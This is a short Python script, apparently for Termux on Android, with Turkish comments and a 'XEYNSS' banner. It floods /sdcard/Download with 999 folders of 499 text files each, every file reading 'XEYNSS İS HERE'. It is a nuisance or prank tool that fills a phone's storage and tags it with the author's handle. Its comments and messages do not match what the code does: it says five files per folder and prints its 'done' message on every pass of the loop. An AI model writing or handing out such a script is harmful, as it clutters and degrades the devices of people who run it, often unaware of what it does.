import os
import pyfiglet

os.system("clear")

LOGO = pyfiglet.figlet_format("XEYNSS")

print(LOGO)
# Klasörleri oluşturmak için bir döngü kullanın
for i in range(1,1000):
    folder_name = f"XEYNSS{i}"  # Klasör adını oluşturun
    folder_path = os.path.join("/sdcard/Download", folder_name)  # Klasörün tam yolu

    # Klasörü oluşturun (eğer daha önce yoksa)
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)

    # Klasörün içine 5 adet "termux" yazan .txt dosyaları ekleyin
    for j in range(1, 500):
        file_name = f"dosya_{j}.txt"
        file_path = os.path.join(folder_path, file_name)
        with open(file_path, "w") as file:
            file.write("XEYNSS İS HERE ")

    print("1000 ADET KLASÖR OLUŞTU. HAYIRLI OLSUN:-)")
